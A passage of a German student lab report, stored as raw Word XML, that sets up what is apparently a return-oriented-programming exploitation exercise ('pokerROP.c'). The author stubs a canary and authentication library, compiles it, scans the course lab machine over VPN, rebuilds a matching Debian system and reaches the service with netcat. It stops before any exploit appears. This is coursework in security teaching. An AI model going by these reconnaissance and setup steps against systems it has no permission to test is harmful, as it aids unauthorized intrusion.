      <w:r w:rsidR="00807F7D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> auth_user und check_user</w:t>
      </w:r>
      <w:r w:rsidR="008E646D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> nicht imp</w:t>
      </w:r>
      <w:r w:rsidR="00476766" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>lementiert sind (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA48115" w14:textId="77777777" w:rsidR="00D12C95" w:rsidRPr="00B47CB9" w:rsidRDefault="00D12C95" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35A70049" w14:textId="048F23CB" w:rsidR="00D12C95" w:rsidRPr="00B47CB9" w:rsidRDefault="00D12C95" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B152288" wp14:editId="364ACCA1">
            <wp:extent cx="5759450" cy="3392805"/>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59450" cy="3392805"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="025CC3CB" w14:textId="3BB06983" w:rsidR="00AB3911" w:rsidRPr="00B47CB9" w:rsidRDefault="00AB3911" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79CC9E2E" w14:textId="405CF115" w:rsidR="00FD15A5" w:rsidRPr="00B47CB9" w:rsidRDefault="00C30663" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Ich debu</w:t>
      </w:r>
      <w:r w:rsidR="00704942">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>gte schrittwiese und kam nach und nach meinem Ziel näher (Beispiel in de</w:t>
      </w:r>
      <w:r w:rsidR="00C31747" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>r Abbildung)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D7DAA2" w14:textId="1D9D8819" w:rsidR="00B4338D" w:rsidRPr="00B47CB9" w:rsidRDefault="00B4338D" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F7AF2FC" w14:textId="13ABEE86" w:rsidR="00525549" w:rsidRPr="00B47CB9" w:rsidRDefault="00525549" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="261E1B4F" wp14:editId="3B04F796">
            <wp:extent cx="4286581" cy="2397082"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>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293913" cy="2401182"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="45EA3863" w14:textId="0B486DA9" w:rsidR="00D83B36" w:rsidRPr="00B47CB9" w:rsidRDefault="00242347" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Die Schlussendlich erstellte C Datei sah dann so aus:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BDCE41" w14:textId="77777777" w:rsidR="00D83B36" w:rsidRPr="00B47CB9" w:rsidRDefault="00D83B36" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="0096527E" w:rsidRPr="00B47CB9" w14:paraId="072B0C6F" w14:textId="77777777" w:rsidTr="0096527E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5525F8B2" w14:textId="77777777" w:rsidR="0096527E" w:rsidRPr="004D58C1" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#ifndef _LIBINETSEC_H_</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CC2961D" w14:textId="77777777" w:rsidR="0096527E" w:rsidRPr="004D58C1" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#define _LIBINETSEC_H_</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40059B05" w14:textId="77777777" w:rsidR="0096527E" w:rsidRPr="004D58C1" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#include &lt;stdbool.h&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3218E968" w14:textId="77777777" w:rsidR="0096527E" w:rsidRPr="004D58C1" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="00BF056A" w14:textId="77777777" w:rsidR="0096527E" w:rsidRPr="004D58C1" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>typedef unsigned char byte;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B3F63B0" w14:textId="77777777" w:rsidR="0096527E" w:rsidRPr="004D58C1" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="09E028EA" w14:textId="77777777" w:rsidR="0096527E" w:rsidRPr="004D58C1" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>void init_canary(byte *canary, char *user, char *pass);</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="778E4D01" w14:textId="77777777" w:rsidR="0096527E" w:rsidRPr="004D58C1" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>bool check_canary(byte *canary1, byte *canary2);</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="292D21D1" w14:textId="77777777" w:rsidR="0096527E" w:rsidRPr="004D58C1" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>int auth_user(char *user, char *pass);</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43770B8B" w14:textId="77777777" w:rsidR="0096527E" w:rsidRPr="004D58C1" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>bool check_usr(char *user, char *pass);</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4902AB50" w14:textId="77777777" w:rsidR="0096527E" w:rsidRPr="004D58C1" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7BCD1EFF" w14:textId="0672F169" w:rsidR="0096527E" w:rsidRPr="00B47CB9" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>#endif</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0096527E" w:rsidRPr="00B47CB9" w14:paraId="020AB4F4" w14:textId="77777777" w:rsidTr="0096527E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="677B58CE" w14:textId="1C3C9521" w:rsidR="0096527E" w:rsidRPr="00B47CB9" w:rsidRDefault="0096527E" w:rsidP="0096527E">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Libinetsec.h</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6E556720" w14:textId="74A3A556" w:rsidR="00C31747" w:rsidRPr="00B47CB9" w:rsidRDefault="00C31747">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E9814ED" w14:textId="28FA5D9A" w:rsidR="00EC31D2" w:rsidRPr="00B47CB9" w:rsidRDefault="00242347">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="00EC31D2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ie Ausgabe bei der Kompilierung bestätigt, dass nur noch die Implementierung zu machen ist.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD851A1" w14:textId="77777777" w:rsidR="00242347" w:rsidRPr="00B47CB9" w:rsidRDefault="00242347">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72B50AC0" w14:textId="54DBA645" w:rsidR="00D83B36" w:rsidRPr="00B47CB9" w:rsidRDefault="00D83B36">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="726FA0AB" wp14:editId="548030C4">
            <wp:extent cx="5759450" cy="2067560"/>
            <wp:effectExtent l="0" t="0" r="0" b="889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59450" cy="2067560"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="09868175" w14:textId="39E86F05" w:rsidR="00D83B36" w:rsidRPr="00B47CB9" w:rsidRDefault="00D83B36">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24F7D7FA" w14:textId="3B47467F" w:rsidR="00932EFF" w:rsidRPr="00B47CB9" w:rsidRDefault="00932EFF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anmerkung: In der </w:t>
      </w:r>
      <w:r w:rsidR="001938FA" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>pokerROP.c Datei wurde einen Backslash hinzugefügt, um diese Warning zu fixen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4CB328" w14:textId="0581F7E0" w:rsidR="001938FA" w:rsidRPr="00B47CB9" w:rsidRDefault="001938FA">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="660F06E4" w14:textId="103FFD86" w:rsidR="001938FA" w:rsidRPr="00B47CB9" w:rsidRDefault="001938FA">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="01EDC6D0" wp14:editId="4CB2F00A">
            <wp:extent cx="5759450" cy="2362200"/>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59450" cy="2362200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B5C7459" w14:textId="77777777" w:rsidR="00D83B36" w:rsidRPr="00B47CB9" w:rsidRDefault="00D83B36">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66331C8D" w14:textId="6F027387" w:rsidR="001938FA" w:rsidRPr="00B47CB9" w:rsidRDefault="001938FA">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ich versuchte dann </w:t>
      </w:r>
      <w:r w:rsidR="00FE50BF" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">auf der Kali Maschine </w:t>
      </w:r>
      <w:r w:rsidR="00487FD0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>das benötigte Library File mit folgendem Befehl zu kompilieren und anschließend zu starten.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC31848" w14:textId="26874D50" w:rsidR="00487FD0" w:rsidRPr="00B47CB9" w:rsidRDefault="00487FD0">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FADB0A8" w14:textId="2D6215E0" w:rsidR="00487FD0" w:rsidRPr="004D58C1" w:rsidRDefault="00487FD0" w:rsidP="00487FD0">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004D58C1">
        <w:rPr>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>gcc -c -fPIC -o libinetsec.o libinetsec.c &amp;&amp; gcc -shared -o libinetsec.so libinetsec.o</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F69A290" w14:textId="428E6ED1" w:rsidR="00945FE0" w:rsidRPr="004D58C1" w:rsidRDefault="00945FE0">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D3E0F2E" w14:textId="1F018E88" w:rsidR="00945FE0" w:rsidRPr="00B47CB9" w:rsidRDefault="00945FE0">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="19C5BEE4" wp14:editId="5238EF3E">
            <wp:extent cx="5362575" cy="1162050"/>
            <wp:effectExtent l="0" t="0" r="9525"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362575" cy="1162050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D997E2B" w14:textId="2A00D2A7" w:rsidR="00251894" w:rsidRPr="00B47CB9" w:rsidRDefault="00251894" w:rsidP="005D50B1">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35E58777" w14:textId="0C616A82" w:rsidR="00251894" w:rsidRPr="00B47CB9" w:rsidRDefault="006F5596" w:rsidP="005D50B1">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Die Anwendung wies einen Fehler auf und ich probierte lange herum, konnte das Problem aber nicht fixen. </w:t>
      </w:r>
      <w:r w:rsidR="00251894" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Daher entsch</w:t>
      </w:r>
      <w:r w:rsidR="00D062DA" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ied ich mich </w:t>
      </w:r>
      <w:r w:rsidR="00EA4AA0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>per VPN ins FH Netz zu verbinden und einen Scan auf die Maschine vorzunehmen:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C773AB5" w14:textId="5513F26B" w:rsidR="00EA4AA0" w:rsidRPr="00B47CB9" w:rsidRDefault="00EA4AA0">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7947C357" w14:textId="218258EF" w:rsidR="00EA4AA0" w:rsidRPr="00B47CB9" w:rsidRDefault="00EA4AA0">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1DAA7553" wp14:editId="53748B1D">
            <wp:extent cx="5759450" cy="1285875"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>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59450" cy="1285875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="209A93E8" w14:textId="6528F5E8" w:rsidR="00F9574E" w:rsidRPr="00B47CB9" w:rsidRDefault="00F9574E">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5ECC9260" w14:textId="49A6CBB8" w:rsidR="006244D3" w:rsidRPr="00B47CB9" w:rsidRDefault="00F9574E" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">In der SSH Version ist ersichtlich, dass </w:t>
      </w:r>
      <w:r w:rsidR="004F6337" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">OpenSSH </w:t>
      </w:r>
      <w:r w:rsidR="004C323D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">7.4p1 Debian als Service ermittelt wurde. Ich </w:t>
      </w:r>
      <w:r w:rsidR="00360054" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">betrieb ein bisschen Recherche und kam zum Schluss, dass </w:t>
      </w:r>
      <w:r w:rsidR="00944226" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>das Betriebssystem</w:t>
      </w:r>
      <w:r w:rsidR="00360054" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> am ehesten eine Debian Stre</w:t>
      </w:r>
      <w:r w:rsidR="00944226" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">tch Variante sein sollte und installierte diese in </w:t>
      </w:r>
      <w:r w:rsidR="006244D3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>der Version 9. Danach musste ich die gewöhnlichen Installationsmaßnahmen durchführen (</w:t>
      </w:r>
      <w:r w:rsidR="001D1DA6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Manipulation</w:t>
      </w:r>
      <w:r w:rsidR="006244D3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001D1DA6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">sources.list, update, packages installieren) </w:t>
      </w:r>
      <w:r w:rsidR="006244D3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">und </w:t>
      </w:r>
      <w:r w:rsidR="001D1DA6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>kopierte den bisherigen Fortschritt auf Debian.</w:t>
      </w:r>
      <w:r w:rsidR="006244D3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FC12E6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ich startete </w:t>
      </w:r>
      <w:r w:rsidR="009B644B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>die Anwendung mit Übergabe von Port 8080 und verband mich mit necat auf den Port und siehe da, nun läuft es:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE21F3F" w14:textId="63D57FB6" w:rsidR="009B644B" w:rsidRPr="00B47CB9" w:rsidRDefault="009B644B" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1091626E" w14:textId="103FB919" w:rsidR="009B644B" w:rsidRPr="00B47CB9" w:rsidRDefault="009B644B" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7EAFF5F9" wp14:editId="2BE0CD48">
            <wp:extent cx="5759450" cy="1742440"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="96" name="Grafik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759450" cy="1742440"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="77ACAC93" w14:textId="366581F5" w:rsidR="006F5596" w:rsidRPr="00B47CB9" w:rsidRDefault="006F5596" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F3765E6" w14:textId="1A4554BD" w:rsidR="006F5596" w:rsidRPr="00B47CB9" w:rsidRDefault="00F77F60" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Nun begann ein ewiges hin und her. Ich habe </w:t>
      </w:r>
      <w:r w:rsidR="00866BC5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
